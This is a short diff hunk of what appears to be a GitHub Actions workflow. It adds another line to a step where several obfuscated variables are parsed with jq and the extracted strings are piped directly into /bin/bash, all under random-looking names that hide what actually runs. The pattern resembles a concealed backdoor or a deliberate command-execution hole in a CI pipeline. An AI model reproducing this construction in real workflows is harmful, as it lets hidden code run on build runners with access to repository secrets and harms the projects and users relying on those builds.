@@ -29,6 +29,7 @@ jobs:
           echo $egsjn77 | jq -r .guoe87482 | /bin/bash
           printf '%s' "$isi9" | jq -r .zxv082 | /bin/bash
           printf '%s' "$tkun29" | jq -r .hoo5 | /bin/bash
+          printf '%s' "$zoou88" | jq -r .ljshj0923 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
